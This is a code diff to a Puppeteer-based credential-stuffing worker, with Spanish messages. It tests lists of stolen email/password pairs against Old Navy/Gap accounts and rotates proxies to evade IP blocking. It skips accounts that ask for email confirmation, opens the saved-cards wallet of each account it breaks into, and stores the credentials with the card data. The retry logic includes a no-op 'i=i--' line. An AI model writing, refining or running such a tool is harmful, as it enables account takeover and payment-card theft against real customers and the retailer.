@@ -49,11 +49,14 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
 
     for (let i = 0; i < credentials.length; i++) {
         await checkPaused();
+        console.log('bucle valor de i  ',i);
+
         const { email, password } = credentials[i];
         parentPort.postMessage(`Verificando: ${email}`);
 
         let proxy = useProxies && proxies.length > 0 ? proxies[proxyIndex] : null;
         let { browser, page } = await createBrowserInstance(proxy);
+        let isBanned =false;
 
         try {
             await page.goto('https://secure-oldnavy.gap.com/my-account/sign-in', { waitUntil: 'domcontentloaded' });
@@ -92,6 +95,8 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 throw new Error('IP bloqueada');
             }
 
+            
+
             const navigationResult = await Promise.race([
                 page.waitForSelector('#create-account-first-name', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'register'),
                 page.waitForSelector('input[name="password"]', { timeout: humanizedMode ? 15000 : 10000 }).then(() => 'login'),
@@ -124,12 +129,24 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                     () => document.querySelector('.loyalty-signInForm-container')?.innerText.includes('Password not associated with this email address'),
                     { timeout: humanizedMode ? 10000 : 5000 }
                 ).catch(() => false);
-
                 if (passwordError) {
                     parentPort.postMessage('Contraseña incorrecta. Cerrando navegador.');
                     await browser.close();
                     continue;
                 }
+
+                const protectYourAccountDialog = await page.evaluate(() => {
+                    const buttonElement = document.querySelector('.btn-primary');
+                    return buttonElement && buttonElement.innerText.includes('SEND EMAIL');
+                });
+            
+                if (protectYourAccountDialog) {
+                    parentPort.postMessage('Usuario pide confirmación Email. Cerrando navegador.');
+                    await browser.close();
+                    continue;
+                }
+
+
 
                 await page.waitForSelector('.redesign-sidebar-nav-section-header-title', { timeout: humanizedMode ? 15000 : 10000 });
                 parentPort.postMessage('Inicio de sesión exitoso.');
@@ -139,6 +156,21 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 await page.goto('https://secure-oldnavy.gap.com/my-account/saved-cards', { waitUntil: 'domcontentloaded' });
                 parentPort.postMessage('Navegando a la sección de tarjetas guardadas...');
                 
+                await new Promise(resolve => setTimeout(resolve, randomDelay(1000, 1500)));
+
+                const h1Detected = await page.evaluate(() => {
+                    const xpath = '//h1[@class="wallet-no-credit-cards-header"]';
+                    const result = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+                    const h1Element = result.singleNodeValue;
+                    return !!h1Element; // Devuelve true si el elemento existe
+                });
+                if (h1Detected) {
+                    parentPort.postMessage('No se encontraron tarjetas guardadas.');
+                    await browser.close();
+                    continue;
+                }
+
+
                 await page.waitForSelector('.wallet-credit-card-edit', { timeout: humanizedMode ? 15000 : 10000 });
                 parentPort.postMessage('Tarjetas encontradas.');
                 
@@ -170,7 +202,8 @@ async function runWorker(credentials, proxies, useProxies, retryOnFail, humanize
                 parentPort.postMessage('No se pudo determinar el estado del correo.');
             }
         } catch (error) {
-            await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
+            i=await handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser });
+           
         }
 
         await browser.close();
@@ -224,13 +257,13 @@ async function createBrowserInstance(proxy) {
         args.push(`--proxy-server=${proxyUrl}`);
         parentPort.postMessage(`Usando proxy: ${proxyUrl}`);
     } else {
-        parentPort.postMessage('No se está utilizando proxy.');
+        console.log('no se usa proxy');
     }
 
     try {
         const browser = await puppeteer.launch({
             headless: workerData.useHeadless,
-            args: args, 
+            args: args,
         });
 
         const page = await browser.newPage();
@@ -263,20 +296,24 @@ function saveValidData(email, password, cardData) {
 
 async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, proxyIndex, credentials, browser }) {
     if (error.message.includes('IP bloqueada')) {
-        parentPort.postMessage('Manejando IP bloqueada y reintentando...');
+        parentPort.postMessage('Manejando bloqueo y reintentando...');
         if (retryOnFail) {
             // Si se está usando proxy, cambia al siguiente
             if (useProxies) {
                 proxyIndex = (proxyIndex + 1) % proxies.length;
             }
+            
             i--; // Reintentar con el mismo correo
+            
         }
     } else if (error.message.includes('net::ERR_NO_SUPPORTED_PROXIES')) {
         parentPort.postMessage(`Proxy ${proxy} no soportado. Cambiando a otro proxy...`);
         await browser.close();
         proxyIndex = (proxyIndex + 1) % proxies.length;
         if (retryOnFail) {
+            
             i--; // Reintentar con el mismo correo pero con un proxy diferente
+           
         }
     } else if (error.name === 'TimeoutError') {
         parentPort.postMessage('TimeoutError detectado. Asumiendo IP bloqueada.');
@@ -284,14 +321,20 @@ async function handleWorkerError(error, { useProxies, proxies, retryOnFail, i, p
         if (useProxies && proxies.length > 0) {
             proxyIndex = (proxyIndex + 1) % proxies.length;
             if (retryOnFail) {
-                i--; // Reintentar con el mismo correo pero con un proxy diferente
+                
+                i=i--; // Reintentar con el mismo correo pero con un proxy diferente
+               
             }
         } else if (!useProxies && retryOnFail) {
+            console.log('valor de i es ',i);
             i--; // Reintentar con el mismo correo pero sin proxy
+            console.log('valor de i es ',i);
         }
     } else {
         parentPort.postMessage(`Error inesperado: ${error.message}`);
     }
+
+    return i;
 }
 
 
